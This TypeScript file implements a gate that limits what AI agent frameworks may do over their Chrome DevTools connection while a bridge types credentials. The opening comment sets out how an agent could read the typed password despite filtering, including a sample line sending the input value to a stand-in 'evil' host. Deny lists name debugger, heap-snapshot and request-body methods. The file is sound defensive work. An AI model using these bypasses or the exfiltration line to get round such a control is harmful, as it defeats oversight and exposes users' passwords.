// Copyright (C) 2026 1Claw
// SPDX-License-Identifier: Apache-2.0

/**
 * What an agent's CDP connection is allowed to do.
 *
 * The bridge is the only process attached to Chromium; frameworks reach it
 * through this gate. That is not a stylistic choice. If browser-use, Hermes or
 * Claude Code keeps its *own* CDP connection to the same Chromium the bridge
 * types into, the no-plaintext invariant fails in one step: after a fill the
 * agent reads `input.value`, the accessibility tree, a screenshot, or the
 * `Network` log of the form POST.
 *
 * Filtering *responses* does not fix that, which is why this is a gate on
 * commands and events rather than a redactor. The bypasses are trivial and
 * endless — `btoa(input.value)`, a char-code transform, or
 * `fetch('https://evil/?'+input.value)`, which exfiltrates without ever
 * returning the value to the agent. Listeners and MutationObservers installed
 * *before* the fill capture keystrokes as `Input.*` delivers them, and
 * `Fetch.enable` sees the POST body in flight no matter what comes back.
 *
 * It is an allowlist, not a denylist. CDP has around fifty domains and gains
 * members every Chromium release; a denylist is out of date the moment it is
 * written, and its failure mode is silent exposure rather than a broken tool.
 */

/** Commands an agent may issue when no fill is in progress on the target. */
const ALLOWED_METHODS: ReadonlySet<string> = new Set([
  // Navigation and lifecycle — the things an agent legitimately drives.
  "Page.navigate",
  "Page.reload",
  "Page.getFrameTree",
  "Page.captureScreenshot",
  "Page.enable",
  "Page.disable",
  // Puppeteer's newPage() throws without this, and the events it turns on are
  // navigation lifecycle for a page the client already owns — the same class as
  // Page.enable, which is allowed one line up. Refusing it made "point your
  // framework at the bridge" false for Puppeteer. Still blocked with everything
  // else on a target during a fill.
  "Page.setLifecycleEventsEnabled",
  // Reading the page it is working on.
  "DOM.getDocument",
  "DOM.querySelector",
  "DOM.querySelectorAll",
  "DOM.getBoxModel",
  "DOM.describeNode",
  "DOM.enable",
  "DOM.disable",
  "Runtime.evaluate",
  "Runtime.callFunctionOn",
  "Runtime.enable",
  "Runtime.disable",
  "Accessibility.getFullAXTree",
  // The rest of the bundle Puppeteer's newPage() enables. It awaits all of
  // them and fails the page on the first rejection, so refusing any one of
  // these is refusing Puppeteer.
  //
  // They are not a widening of what an agent can read. Runtime.enable is
  // already allowed two lines up and delivers console output through
  // Runtime.consoleAPICalled; Audits reports page issues, Performance reports
  // metrics, and Log carries browser-level entries. None reads a form field,
  // and all of them are blocked with everything else on a target during a
  // fill — which happens on a fresh target the agent has no session on at all.
  "Audits.enable",
  "Performance.enable",
  "Log.enable",
  // Puppeteer installs a utility-world script on every new document, and fails
  // the page without it.
  //
  // This is the pre-installed-script shape the fill policy worries about — a
  // listener in place before the typing starts, which no CDP command during the
  // window would reveal. It is allowed because it is not what protects the
  // fill: the script is session-scoped to the target the client installed it
  // on, and the bridge types into a target it creates fresh for the fill, which
  // the agent has never had a session on and so has never scripted. That is the
  // control. Absent it, Runtime.evaluate — allowed since the first commit —
  // installs the same listener with one more line.
  "Page.addScriptToEvaluateOnNewDocument",
  // The other half of the same utility world: Puppeteer creates it per frame
  // and evaluates its own helpers there. Same power as the line above, and the
  // same reason it does not weaken the fill — the fill target is one the agent
  // has no session on.
  "Page.createIsolatedWorld",
  // Viewport. Puppeteer applies a default 800x600 to every page it opens and
  // fails the page if it cannot. These write display geometry and read nothing.
  "Emulation.setDeviceMetricsOverride",
  "Emulation.clearDeviceMetricsOverride",
  "Emulation.setTouchEmulationEnabled",
  // Playwright's connectOverCDP applies these to every page it adopts and
  // aborts the connection if any is refused. Like the viewport above, they set
  // how the page renders and read nothing out of it.
  "Emulation.setFocusEmulationEnabled",
  "Emulation.setEmulatedMedia",
  "Emulation.setLocaleOverride",
  "Emulation.setTimezoneOverride",
  "Emulation.setGeolocationOverride",
  "Page.setFontFamilies",
  // Ordinary interaction.
  "Input.dispatchMouseEvent",
  "Input.dispatchKeyEvent",
  "Input.insertText",
  // Target enumeration, so a framework can find its own context.
  "Target.getTargets",
  "Target.getTargetInfo",
  "Target.attachToTarget",
  // An agent has to be able to open and close its own pages, or no framework
  // can drive this at all. Safe because the proxy places every target it opens
  // in that client's own browser context — it cannot reach another client's
  // pages, and it cannot choose a context, since createBrowserContext is
  // refused outright.
  "Target.createTarget",
  "Target.closeTarget",
  // Network *metadata* only. Bodies are handled separately below.
  "Network.enable",
  "Network.disable",
  "Network.getCookies",
  "Network.setCookie",
  "Network.deleteCookies",
]);

/**
 * Commands refused outright, on any target, at any time.
 *
 * These read request or response *bodies*. A login POST body contains the
 * password whether or not a fill window happens to be open, and there is no
 * legitimate agent use that needs them through this gate.
 *
 * The plan allows either per-request denial (tracking ids seen during a fill
 * window) or wholesale denial. Wholesale is taken here: it is strictly
 * stronger, it needs no state that could be missed or evicted, and deferring
 * the read until after the window — the obvious bypass against per-request
 * tracking — is not a case that has to be reasoned about at all.
 */
const NEVER_ALLOWED: ReadonlySet<string> = new Set([
  "Network.getRequestPostData",
  "Network.getResponseBody",
  "Network.getResponseBodyForInterception",
  "Network.takeResponseBodyForInterceptionAsStream",
  "Fetch.enable",
  "Fetch.getResponseBody",
  "Fetch.continueWithAuth",
  "Fetch.takeResponseBodyAsStream",
  // Debugger lets a caller pause on the typing path and read locals.
  "Debugger.enable",
  "Debugger.setBreakpoint",
  "Debugger.setBreakpointByUrl",
  "Debugger.pause",
  // A heap snapshot contains every string on the page, including what was typed.
  "HeapProfiler.takeHeapSnapshot",
  "HeapProfiler.collectGarbage",
  "Memory.getAllTimeSamplingProfile",
  // Re-attaching outside the gate would make all of this moot.
  "Target.createBrowserContext",
  "Target.setDiscoverTargets",
  "Target.setAutoAttach",
  "Browser.close",
  "Browser.getBrowserCommandLine",
]);

/**
 * Events never forwarded to an agent, on any target.
 *
 * `requestWillBeSent` carries `postData`. Both are push events, so an agent
 * that enabled the domain before a fill would otherwise receive them without
 * issuing a command.
 */
const NEVER_FORWARDED_EVENTS: ReadonlySet<string> = new Set([
  "Debugger.paused",
  "Debugger.scriptParsed",
]);

/**
 * Events forwarded only after their headers are removed.
 *
 * These two were refused outright, for a good reason: `associatedCookies` and
 * the raw `Cookie` / `Set-Cookie` headers are exactly what a fill produces, and
 * they arrive as push events, so an agent that enabled the Network domain
 * beforehand would receive them without issuing a command during the window.
 *
 * But refusing them broke every stock client. Puppeteer's network bookkeeping
 * waits for the ExtraInfo pair before it will settle a navigation, so
 * `page.goto()` never resolved — while `page.content()` returned the new
 * document, because the navigation itself had completed. Diffing the event
 * stream against a raw Chromium showed these two as the *only* difference.
 *
 * What the client needs is that the event happened, with its requestId. What it
 * must not have is the headers. So the event is delivered with the sensitive
 * fields stripped rather than withheld entirely — the client's state machine
 * advances, and the agent learns nothing it could not already see from
 * `Network.responseReceived`.
 */
const HEADER_STRIPPED_EVENTS: ReadonlySet<string> = new Set([
  "Network.requestWillBeSentExtraInfo",
  "Network.responseReceivedExtraInfo",
]);

/**
 * The fields carrying credential material, and what replaces them.
 *
 * Emptied, not deleted. A client reads `Object.keys(headers)` without checking
 * whether the field is there, so removing it crashes the client instead of
 * protecting anything — the first version of this did exactly that. An empty
 * value of the right shape is what "no headers for you" has to look like.
 */
const STRIPPED_FIELDS: ReadonlyArray<readonly [string, unknown]> = [
  // Checked against what Chromium actually sends, not against what the CDP
  // docs list. requestWillBeSentExtraInfo carries `associatedCookies` and
  // `headers`; responseReceivedExtraInfo carries `blockedCookies`, `headers`,
  // `headersText`, `cookiePartitionKey` and `exemptedCookies`. `blockedCookies`
  // was missing from the first version of this list — it holds whole cookie
  // objects, values included, and a list written from memory did not have it.
  ["headers", {}],
  ["headersText", ""],
  ["associatedCookies", []],
  ["blockedCookies", []],
  ["exemptedCookies", []],
  ["cookiePartitionKey", undefined],
];

/**
 * Remove the credential-bearing fields from an event that is forwarded for its
 * shape rather than its contents. Returns the event unchanged if it is not one
 * of those.
 */
export function redactEventForAgent(
  method: string,
  params: Readonly<Record<string, unknown>> | undefined,
): Record<string, unknown> | undefined {
  if (!HEADER_STRIPPED_EVENTS.has(method) || params === undefined) return params as never;
  const out: Record<string, unknown> = { ...params };
  for (const [field, empty] of STRIPPED_FIELDS) {
    if (!(field in out)) continue;
    if (empty === undefined) delete out[field];
    else out[field] = Array.isArray(empty) ? [] : typeof empty === "string" ? "" : {};
  }
  return out;
}

export type CdpDecision =
  | { readonly allow: true }
  | { readonly allow: false; readonly reason: CdpDenyReason; readonly message: string };

export type CdpDenyReason =
  | "fill_in_progress"
  | "method_not_allowed"
  | "body_access_denied"
  | "unknown_target";

const ALLOW: CdpDecision = { allow: true };

const deny = (reason: CdpDenyReason, message: string): CdpDecision => ({
  allow: false,
  reason,
  message,
});

export type CdpCommand = {
  readonly method: string;
  /** Target the command is addressed to. Absent means browser-level. */
  readonly targetId?: string;
  readonly params?: Readonly<Record<string, unknown>>;
};

export type CdpEvent = {
  readonly method: string;
  readonly targetId?: string;
  readonly params?: Readonly<Record<string, unknown>>;
};

/**
 * Tracks fill windows and decides what the agent's CDP connection may do.
 *
 * One gate per bridge process; fill windows are per target, so a fill on one
 * tab does not freeze an agent working in another.
 */
export class CdpGate {
  /** Targets with a fill in progress. */
  readonly #fillTargets = new Set<string>();

  openFillWindow(targetId: string): void {
    this.#fillTargets.add(targetId);
  }

  closeFillWindow(targetId: string): void {
    this.#fillTargets.delete(targetId);
  }

  isFilling(targetId: string): boolean {
    return this.#fillTargets.has(targetId);
  }

  /** Decide whether the agent may issue this command. */
  evaluateCommand(cmd: CdpCommand): CdpDecision {
    if (NEVER_ALLOWED.has(cmd.method)) {
      return deny(
        cmd.method.startsWith("Network.") || cmd.method.startsWith("Fetch.")
          ? "body_access_denied"
          : "method_not_allowed",
        `${cmd.method} is never available through the bridge`,
      );
    }

    // A fill in progress blocks the whole target, not just the field. Anything
    // less leaves `Runtime.evaluate` free to read the value being typed.
    if (cmd.targetId && this.#fillTargets.has(cmd.targetId)) {
      return deny("fill_in_progress", "a credential fill is in progress on this target");
    }

    if (!ALLOWED_METHODS.has(cmd.method)) {
      return deny("method_not_allowed", `${cmd.method} is not on the bridge allowlist`);
    }

    return ALLOW;
  }

  /**
   * Decide whether an event may be delivered to the agent.
   *
   * Events are dropped, never queued: replaying them once the window closes
   * would hand over exactly what suppressing them prevented.
   */
  shouldForwardEvent(evt: CdpEvent): boolean {
    if (NEVER_FORWARDED_EVENTS.has(evt.method)) return false;
    if (evt.targetId && this.#fillTargets.has(evt.targetId)) return false;
    return true;
  }
}
